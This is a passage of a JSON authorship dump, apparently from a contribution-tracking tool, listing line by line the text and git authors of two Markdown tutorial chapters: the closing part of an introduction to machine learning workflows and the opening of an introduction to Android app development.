        "content": "\u003csub\u003e(samples from [cifar10 dataset](https://www.cs.toronto.edu/~kriz/cifar.html))\u003c/sub\u003e"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "#### Unsupervised Learning"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "Unsupervised learning algorithms do not require labels. "
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "Using clustering as an example, the data is split into groups by the algorithm. The downside is that it is difficult to explain the relationships between items grouped. "
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "This approach can be used by e-commerce sites to identify similar products, where a clear and interpretable label for similar products is not required."
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://cdn-images-1.medium.com/max/900/1*xTvsgpDfja05SRMt-H5ylA.png\" width\u003d\"450\"\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "\u003csub\u003e(T-SNE of Products Shape and Colour by [Eddie Bell](https://twitter.com/ejlbell/status/698309469965516800))\u003c/sub\u003e  "
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "The following are popular resources for ML algorithms:"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- Machine Learning: [Stanford CS229](http://cs229.stanford.edu/)"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "- Convolutional Neural Networks for Visual Recognition: [Stanford CS231n](http://cs231n.stanford.edu/)"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- Natural Language Processing with Deep Learning: [Stanford CS224n](http://cs224n.stanford.edu/)"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- A Practical Approach Towards Neural Networks: [University of San Francisco, FastAI](https://www.fast.ai/)"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "*Neural networks* and *Deep Learning* are classes of ML algorithms.  "
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "They both contain supervised and unsupervised algorithms. "
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "Note that there is one other category of ML algorithms, called *reinforcement learning*. "
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "Reinforcement learning is different from the above mentioned categories and will not be discussed in this introductory piece. More information on Reinforcement Learning can be found in [this article (from Medium)](https://hackernoon.com/reinforcement-learning-part-1-d2f469a02e3b)."
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "### Types of Data"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "Data is broadly split into 2 categories, *structured* and *unstructured*. "
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "- **Structured data** refers to data in a standardized format with categories and values. Structured data is formatted like data in relational databases. A good example would be sales records, with fields like date, quantity sold, location and such.  "
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "- **Unstructured data** refers to data without a predefined structure, such as images, audio and textual data."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "The distinction between the types of data is important as ML algorithms are not always compatible with both data types. For example, [Decision trees](https://en.wikipedia.org/wiki/Decision_tree) cannot be used for unstructured data. Data must be modified to a structured form for use with decision tree related algorithms."
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How is Machine Learning Applied?"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "Bringing a machine learning algorithm to production requires a workflow which differs greatly from that of software engineering. This is due to a focus on prototyping.  "
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "Prototyping is required as ML algorithms vary in efficacy when used in different domains, each domain containing data of a different nature."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "The algorithms contain various parameters that can be tuned to improve efficacy. Experimentation is required to discover the algorithm and parameters which give the best performance."
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "A machine learning algorithm is referred to as a *model*, after it is fed with data. "
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "The entire prototyping process is similar to scientific experiments, where many model configurations are experimented on. Practitioners come up with a hypothesis on whether a configuration may improve performance, and verify if performance is as expected."
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "### Prototyping Platforms and Tools"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "The prototyping phase in ML is usually done on [Jupyter notebooks](https://jupyter.org/), or [RStudio](https://www.rstudio.com/products/rstudio/). The highlight of programming languages like Python and R, and the accompanying software is their strong support for experimentation and visualization of results. "
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "Interpreted languages such as Python and R speed up prototyping iterations as they are less verbose than compiled languages like Java or C. "
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "Visualizations such as bar charts, graphs or just displaying the data assist in analysis and sharing of findings. "
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "Code style, clarity and maintainability are less of a priority at this stage. A good example of Juptyer notebooks in action can be found at [this page (from Kaggle)](https://www.kaggle.com/pmarcelino/comprehensive-data-exploration-with-python)."
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "### Prototyping Workflow"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "Prototyping can be broken down into the following phases:  "
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "1) Basic data preprocessing  "
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "2) Partitioning of data   "
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "3) Model training, evaluation and data analysis  "
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "4) Repeating step 3  "
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "### Basic Data Preprocessing"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "The quantity, quality and type of data differs greatly across domains, sometimes containing errors such as corruption or mislabelling. Basic data preprocessing is required to remove such data. "
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "Other areas of concern are class imbalance (for supervised learning), where there are more data points in one class as compared to another. The data is modified in various ways to tackle class imbalance. This [paper](https://arxiv.org/abs/1710.05381v1) details various techinques for tackling class imbalance. "
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "### Partitioning of Data"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "Data is usually split into 3 sets after preprocessing: the *test set*, *validation set* and *training set*. "
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "The FastAI ML MOOC\u003csup\u003e[1](#fast-ai-ml)\u003c/sup\u003e is a great source of information on data partitioning. "
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://dziganto.github.io/assets/images/train-validate-test.png?raw\u003dtrue\" width\u003d\"300\"/\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "\u003csub\u003e(Data partitioning visualization by [David Zigano](https://dziganto.github.io/cross-validation/data%20science/machine%20learning/model%20tuning/python/Model-Tuning-with-Validation-and-Cross-Validation/))"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "#### Test Set"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "ML algorithms are never 100% accurate. Testing ML algorithms on real world data is essential for estimating their efficacy. "
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "Furthermore, ML models run the risk of overfitting the data they were trained on.  Overfitting is a modelling error which occurs when models learn patterns unique to a subset of data. "
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "A model which overfits training data performs well on training data but is unable to translate this performance to real world data."
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "A thorough explanation of overfitting can be found in [this article (from EliteDataScience)](https://elitedatascience.com/overfitting-in-machine-learning)."
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "A test set solves the overfitting problem. A test set which resembles real world data as much as possible is created by partitioning the available data. Its size is dependent on the data available. The test set is used only for testing model performance, and will not be touched during model training. "
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Different schemes for partitioning must be used for data with different characteristics. More information on splitting test and validation sets (discussed next) can be found in [this article (from FastAI)](https://www.fast.ai/2017/11/13/validation-sets/)."
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "#### Validation Set"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "A validation set is created from the remaining data in a similar fashion as the test set. The validation set is used to evaluate the performance of adjusting a model\u0027s parameters. Adjusting model parameters and verifying performance is conducted on the validation set to prevent overfitting the test set."
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "Guidelines on picking a size for the validation set can be found in Lesson 7 of FastAI\u0027s ML MOOC\u003csup\u003e[1](#fast-ai-ml)\u003c/sup\u003e. "
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "The following driving factors are suggested for deciding the validation set size.  "
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "- Business Concerns   "
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "Business concerns determine the significance of mistakes in predictions. For example, 4 mistakes in fraud detection is a much bigger issue than 4 mistakes in [cucumber classification](https://cloud.google.com/blog/big-data/2016/08/how-a-japanese-cucumber-farmer-is-using-deep-learning-and-tensorflow). A large enough validation set tells us if the difference in performance between 2 models is significant enough for the given problem. "
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "- Statistical Stability  "
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "Each class should have at least 22 data points, so that the validation set follows an approximate normal distribution. This allows easier statistical analysis."
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "#### Training Set"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "The remaining data forms the training set.  "
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": "Data in the training set is used for training the model."
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": "Practitioners may choose to create a sample set from the training set, with a much smaller amount of data. This allows for quicker testing and refinement iterations. Training on the training set happens after a good set of algorithm parameters is found. This action is justified for Deep Learning and possibly other types ML algorithms, as seen in [recent research](https://blog.acolyer.org/2018/03/28/deep-learning-scaling-is-predictable-empirically/)."
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": "### Model Training, Evaluation, Data Analysis"
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "Models are evaluated on the validation set after training on the training set."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": "Practitioners perform data analysis on the results to gain insights on the data."
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "These insights guide the practitioner in tweaking the data and model for better performance."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "An example of data analysis for convolutional neural networks (an emerging class of ML algorithms) is to observe what the neural network is looking at when it makes its predictions. This can be done with class activation maps. After which, the practitioner may choose to perform further data preprocessing to help the neural network focus on the right areas. "
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"http://cnnlocalization.csail.mit.edu/example.jpg\" width\u003d\"600\"/\u003e\u003cbr/\u003e"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "\u003csub\u003e(Class activation maps, more information at http://cnnlocalization.csail.mit.edu)\u003c/sub\u003e"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Tweaking parameters and retraining the algorithm continues until the practitioner is satisfied with a particular model\u0027s performance. The model\u0027s score on the test set is used for selecting between different algorithms at the production stage."
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "### Production"
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "The best algorithm discovered is rewritten for production. They are usually rewritten in performance focused languages like C++, or in lower level ML frameworks such as Tensorflow. "
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "Models are retrained on a regular basis when more data is available, allowing the model to learn new patterns from the data."
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "Techniques such as model compression must also be used to ensure that the models are within the desired size limit and perform fast enough. This [paper](https://arxiv.org/abs/1710.09282) contains a survey of existing compression techniques for neural networks. "
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "Models are often trained against adversarial attacks for security reasons."
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "An article detailing adversarial attacks on Deep Learning algorithms can be found in [this article (from OpenAI)](https://blog.openai.com/adversarial-example-research/)."
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some articles and videos detailing the process of deploying ML algorithms for production.  "
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "Dropbox: [OCR and automatic document rotation](https://blogs.dropbox.com/tech/2017/04/creating-a-modern-ocr-pipeline-using-computer-vision-and-deep-learning/)  "
      },
      {
        "lineNumber": 202,
        "author": {
          "gitId": "-"
        },
        "content": "Mozilla: [DeepSpeech for voice recognition](https://hacks.mozilla.org/2017/11/a-journey-to-10-word-error-rate/)  "
      },
      {
        "lineNumber": 203,
        "author": {
          "gitId": "-"
        },
        "content": "PyData: [Youtube Channel](https://www.youtube.com/user/PyDataTV/videos)"
      },
      {
        "lineNumber": 204,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 205,
        "author": {
          "gitId": "-"
        },
        "content": "### Concluding Remarks "
      },
      {
        "lineNumber": 206,
        "author": {
          "gitId": "-"
        },
        "content": "The process of coding a ML algorithm for production is an process fairly different from regular software development. "
      },
      {
        "lineNumber": 207,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 208,
        "author": {
          "gitId": "-"
        },
        "content": "This chapter covers only the process of bringing a ML algorithm from prototyping to production, with little mention of specific algorithms. "
      },
      {
        "lineNumber": 209,
        "author": {
          "gitId": "-"
        },
        "content": "The process is mostly similar for all ML algorithms, from classical to emerging algorithms from Deep Learning."
      },
      {
        "lineNumber": 210,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 211,
        "author": {
          "gitId": "-"
        },
        "content": "## Supplementary Resources"
      },
      {
        "lineNumber": 212,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 213,
        "author": {
          "gitId": "-"
        },
        "content": "Commonly used libraries for machine learning"
      },
      {
        "lineNumber": 214,
        "author": {
          "gitId": "-"
        },
        "content": "- General Machine Learning"
      },
      {
        "lineNumber": 215,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "  - [Numpy](https://www.numpy.org/), provides support for large, multi-dimensional arrays, matrices \u0026 mathematical functions for operating these data structures"
      },
      {
        "lineNumber": 216,
        "author": {
          "gitId": "-"
        },
        "content": "  - [Pandas](https://pandas.pydata.org/), data analysis tool in Python"
      },
      {
        "lineNumber": 217,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "  - [Scikit-Learn](https://scikit-learn.org/stable/), contains a big variety of machine learning algorithms (excluding Deep Learning)"
      },
      {
        "lineNumber": 218,
        "author": {
          "gitId": "-"
        },
        "content": "- Deep Learning"
      },
      {
        "lineNumber": 219,
        "author": {
          "gitId": "-"
        },
        "content": "  - [TensorFlow](https://www.tensorflow.org/), library for Deep Learning by Google"
      },
      {
        "lineNumber": 220,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "  - [Stanford CS20: Tensorflow for Deep Learning Research](https://web.stanford.edu/class/cs20si/), up to date best practices for Tensorflow"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "  - [Pytorch](https://pytorch.org/), by Facebook"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": "Popular resources for keeping up with machine learning research"
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "- [https://arxiv.org/](https://arxiv.org/) (repository of electronic preprints of scientific papers)"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [https://www.arxiv-sanity.com](https://www.arxiv-sanity.com) (provides a better browsing experience than Arxiv)"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "- [https://openreview.net/](https://openreview.net/) (peer reviews of research papers submitted to conferences)"
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "## Footnotes"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ca name\u003d\"fast-ai-ml\"\u003e[1]\u003c/a\u003e: No link is provided as MOOC is in unofficial release at time of writing  "
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 4,
      "jamessspanggg": 11,
      "iskandarzulkarnaien": 23,
      "-": 193
    }
  },
  {
    "path": "contents/android/IntroToAndroid.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Introduction to Android App Development"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Introduction to Android App Development"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Lee Yan Hwa](https://github.com/leeyh20)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "- [Getting Started](#1-getting-started)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": "    - [What is Android?](#11-what-is-android)"
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Why Android?](#12-why-android)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Why should I make native Android apps?](#13-why-should-i-make-native-android-apps)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Develop your first app today!](#14-develop-your-first-app-today)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "- [Android is not magic](#2-android-is-not-magic)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "    - [App Components](#21-app-components)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Activity Lifecycle](#22-activity-lifecycle)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "    - [The Architecture of Android](#23-the-architecture-of-android)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "- [Useful Android Developer Tools](#3-useful-android-developer-tools)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Testing](#31-testing)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "    - [Debugging](#32-debugging)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "- [Further Readings](#4-further-readings)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "## 1. Getting Started"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "### 1.1 What is Android?"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "Android is a Linux-based mobile phone operating system (OS) that was acquired by Google in 2005 and was launched in 2008. Not only does it power phones, it is already the OS of watches, televisions and even car stereo systems."
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "The Android mascot is a green robot."
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "![Android Mascot](https://developer.android.com/images/brand/Android_Robot_100.png)"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "The source code of Android is made available through the [Android Open Source Project](https://source.android.com/) (AOSP). The original AOSP code is used mainly on the Nexus and Pixel phones that are developed by Google themselves. The AOSP code is then customized and adapted by original equipment manufacturers (OEMs), such as Samsung and Sony, to run on their respective phones. There is a list of OEMs [here](https://www.android.com/certified/partners/). This is why the same Android OS looks very different on phones made by the different OEMs. Unlike iOS, which is only found on iPhones and iPads, there is a huge variety of phones that run the Android OS."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "The official way to download apps on the Android OS is to use the Google Play Store. However, it is also possible to download an Android Package Kit (APK) and install the app directly onto your Android device. However, you should be careful when downloading such APK files."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "### 1.2 Why Android?"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Why should we develop apps for Android? This is because Android has become the [world\u0027s most popular mobile platform](https://developer.android.com/about/android.html). The popularity of Android cannot be denied. The Google Play Store currently has around 3 million apps as of 2017 ([source](https://www.businessofapps.com/data/app-statistics/)). It\u0027s a great time to step into the world of developing Android apps!"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "Android phones range from the premium Samsung phones to the lower-end handsets such as Huawei\u0027s budget Honor phones. Thus Android\u0027s edge over iOS is that it is not only popular in established markets, but it is hugely popular in emerging markets such as India and China. Thus by developing an app for Android, you will be able to reach a wider range of audience for your app. Additionally, it is cheaper to get your app onto Google Play Store - there is only a one-time registration fee while you will have to pay a yearly fee to join the Apple Developer Program. Furthermore, Android being Open Source also means that it is well-known for its \"openness\". Overall, there are less restrictions for developers and it is easier to get your apps approved on the Google Play Store. Plus, you even need to have Mac to publish apps onto the Apple App Store - Google does not have such restrictions."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
